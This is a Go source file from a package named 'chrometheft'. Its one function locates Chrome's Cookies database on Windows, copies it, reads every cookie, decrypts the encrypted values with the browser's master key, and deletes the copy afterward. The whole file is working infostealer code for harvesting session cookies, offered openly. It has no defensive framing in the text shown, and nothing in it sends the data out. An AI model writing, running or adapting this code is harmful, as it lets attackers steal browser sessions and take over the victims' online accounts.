package chrometheft

import (
	"database/sql"
	"errors"
	"os"
)

type Cookie struct {
	HostKey string `json:"host_key"`
	Path    string `json:"path"`
	Name    string `json:"name"`
	Value   string `json:"value"`
}

func GetCookies(path string) ([]Cookie, error) {
	cookies := make([]Cookie, 0)

	dbFile := path + "\\User Data\\Default\\Cookies"
	if !fileExists(dbFile) {
		dbFile = path + "\\User Data\\Default\\Network\\Cookies"
		if !fileExists(dbFile) {
			return cookies, errors.New("Cookies file not found")
		}
	}

	// make a copy of the cookies file
	copyFile(dbFile, dbFile+".bak")
	dbFile += ".bak"

	// open the cookies file
	db, err := sql.Open("sqlite3", dbFile)
	if err != nil {
		return cookies, err
	}

	// select rows from the cookies file
	rows, err := db.Query("SELECT host_key, path, name, value, encrypted_value FROM cookies")
	if err != nil {
		return cookies, err
	}
	defer func() {
		// clean up
		rows.Close()
		db.Close()
		os.Remove(dbFile)
	}()

	masterKey, err := GetMasterKey(path)

	for rows.Next() {
		var hostKey, path, name, value, encryptedValue string
		err = rows.Scan(&hostKey, &path, &name, &value, &encryptedValue)
		if err != nil {
			continue // make sure to iterate over all rows
		}

		if value == "" || encryptedValue != "" {
			value, err = DecryptEncryptedData(encryptedValue, masterKey)
		}

		if hostKey != "" && path != "" && name != "" && value != "" {
			cookies = append(cookies, Cookie{HostKey: hostKey, Path: path, Name: name, Value: value})
		}
	}

	return cookies, nil
}
